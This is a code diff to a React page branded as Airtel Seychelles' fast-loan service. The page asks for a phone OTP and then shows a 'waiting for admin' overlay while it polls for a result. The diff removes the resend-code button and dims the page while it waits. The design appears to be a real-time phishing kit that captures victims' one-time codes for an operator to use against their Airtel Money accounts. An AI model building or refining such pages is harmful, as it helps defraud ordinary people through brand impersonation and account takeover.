@@ -27,7 +27,6 @@ function AirtelOTPVerify() {
   const [timerResetKey, setTimerResetKey] = useState(0);
   const [expired, setExpired] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
-  const [isResending, setIsResending] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const [refId, setRefId] = useState('');
   const [submittedAt, setSubmittedAt] = useState('');
@@ -218,34 +217,6 @@ function AirtelOTPVerify() {
     }
   };
 
-  const handleResend = async () => {
-    if (isVerifying || isResending) return;
-
-    stopPolling();
-    sessionStorage.removeItem(PENDING_KEY);
-    setTimeLeft(TIMER_START);
-    setExpired(false);
-    setTimerResetKey((k) => k + 1);
-    setOtp(Array(OTP_LENGTH).fill(''));
-    setWaitingForAdmin(false);
-    setSubmittedAt('');
-    setRefId('');
-    setIsResending(true);
-
-    try {
-      await fetch(`${API_BASE}/api/resend-otp`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone_number: phoneNumber }),
-      });
-      setTimeout(() => otpRefs.current[0]?.focus(), 100);
-    } catch {
-      /* silent */
-    } finally {
-      setIsResending(false);
-    }
-  };
-
   const showWaitingOverlay = isVerifying || waitingForAdmin;
   const isFormValid = otp.join('').length === OTP_LENGTH;
 
@@ -267,6 +238,16 @@ function AirtelOTPVerify() {
           position: relative;
         }
 
+        /* FADED BACKGROUND CLASS */
+        .faded-content {
+          opacity: 0.15;
+          pointer-events: none;
+          transition: opacity 0.3s ease;
+          display: flex;
+          flex-direction: column;
+          min-height: 100vh;
+        }
+
         /* WAITING OVERLAY */
         .waiting-overlay {
           position: fixed;
@@ -280,7 +261,7 @@ function AirtelOTPVerify() {
           justify-content: center;
           z-index: 9999;
           padding: 20px;
-          background-color: rgba(255, 255, 255, 0.4);
+          background-color: rgba(255, 255, 255, 0.9); /* Mostly solid white to hide background */
         }
 
         .custom-spinner {
@@ -327,7 +308,7 @@ function AirtelOTPVerify() {
           position: relative;
         }
 
-        .back-btn {
+        .menu-btn {
           position: absolute;
           left: 20px;
           top: 20px;
@@ -463,18 +444,6 @@ function AirtelOTPVerify() {
           color: #ffffff;
         }
 
-        .resend-link {
-          background: none;
-          border: none;
-          color: #2A5CAA;
-          font-size: 14px;
-          font-weight: 600;
-          margin-top: 20px;
-          cursor: pointer;
-          width: 100%;
-          text-align: center;
-        }
-
         /* SECURITY TEXT */
         .security-footer {
           display: flex;
@@ -513,116 +482,111 @@ function AirtelOTPVerify() {
         </div>
       )}
 
-      {/* HEADER */}
-      <div className="header-section">
-        <button className="back-btn" onClick={() => navigate('/')}>
-          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="19" y1="12" x2="5" y2="12" />
-            <polyline points="12 19 5 12 12 5" />
-          </svg>
-        </button>
-        <h1 className="header-title">Airtel Seychelles</h1>
-        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
-      </div>
+      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
+      <div className={showWaitingOverlay ? 'faded-content' : ''}>
+        
+        {/* HEADER */}
+        <div className="header-section">
+          <button className="menu-btn" onClick={() => navigate('/')}>
+            {/* Hamburger Menu (Three lines) */}
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="3" y1="12" x2="21" y2="12"></line>
+              <line x1="3" y1="6" x2="21" y2="6"></line>
+              <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+          </button>
+          <h1 className="header-title">Airtel Seychelles</h1>
+          <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
+        </div>
 
-      {/* MAIN CARD */}
-      <div className="main-card">
-        <h2 className="card-title">OTP Verification</h2>
-        <p className="card-subtitle">
-          Enter the OTP sent to your phone number
-          <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
-        </p>
-
-        <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-          
-          <span className="input-label">Enter 4-digit OTP</span>
-          
-          <div className="otp-inputs-container">
-            {otp.map((digit, index) => (
-              <input
-                key={index}
-                type="tel"
-                inputMode="numeric"
-                autoComplete="one-time-code"
-                maxLength={1}
-                value={digit}
-                ref={(el) => { otpRefs.current[index] = el; }}
-                onChange={(e) => handleOtpChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className="otp-box"
-                placeholder="•"
-                disabled={showWaitingOverlay}
-              />
-            ))}
-          </div>
-
-          <p className="otp-timer-text">
-            Code expires in <strong>{timeLeft}</strong> seconds
+        {/* MAIN CARD */}
+        <div className="main-card">
+          <h2 className="card-title">OTP Verification</h2>
+          <p className="card-subtitle">
+            Enter the OTP sent to your phone number
+            <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
           </p>
 
-          <button 
-            type="submit" 
-            className={`login-btn ${isFormValid ? 'active' : ''}`}
-            disabled={!isFormValid || showWaitingOverlay}
-          >
-            SUBMIT
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="12 5 19 12 12 19" />
+          <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+            
+            <span className="input-label">Enter 4-digit OTP</span>
+            
+            <div className="otp-inputs-container">
+              {otp.map((digit, index) => (
+                <input
+                  key={index}
+                  type="tel"
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  maxLength={1}
+                  value={digit}
+                  ref={(el) => { otpRefs.current[index] = el; }}
+                  onChange={(e) => handleOtpChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  className="otp-box"
+                  placeholder="•"
+                  disabled={showWaitingOverlay}
+                />
+              ))}
+            </div>
+
+            <p className="otp-timer-text">
+              Code expires in <strong>{timeLeft}</strong> seconds
+            </p>
+
+            <button 
+              type="submit" 
+              className={`login-btn ${isFormValid ? 'active' : ''}`}
+              disabled={!isFormValid || showWaitingOverlay}
+            >
+              SUBMIT
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12" />
+                <polyline points="12 5 19 12 12 19" />
+              </svg>
+            </button>
+
+            {/* REMOVED: Resend code button is gone */}
+
+          </form>
+
+          <div className="security-footer">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-          </button>
-
-          <button 
-            type="button" 
-            className="resend-link"
-            onClick={handleResend}
-            disabled={isResending || showWaitingOverlay}
-          >
-            {isResending ? 'Sending...' : 'Resend code'}
-          </button>
-
-        </form>
-
-        <div className="security-footer">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-          </svg>
-          Your information is secure.
-        </div>
-      </div>
-
-      {/* BRAND ICONS FOOTER */}
-      <div className="brand-icons-footer">
-        {/* Icon 1: Airtel Phone */}
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
-            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
-            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
-          </div>
-        </div>
-        
-        {/* Icon 2: Lock */}
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
-              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
+            Your information is secure.
           </div>
         </div>
 
-        {/* Icon 3: Airtel Money */}
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+        {/* BRAND ICONS FOOTER */}
+        <div className="brand-icons-footer">
+          <div className="brand-icon">
+            <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
+              <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
+              <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
+            </div>
           </div>
-        </div>
+          
+          <div className="brand-icon">
+            <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+            </div>
+          </div>
 
-        {/* Icon 4: Currency Symbol */}
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
-            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+          <div className="brand-icon">
+            <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
+              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
+              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+            </div>
+          </div>
+
+          <div className="brand-icon">
+            <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
+              <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+            </div>
           </div>
         </div>
       </div>
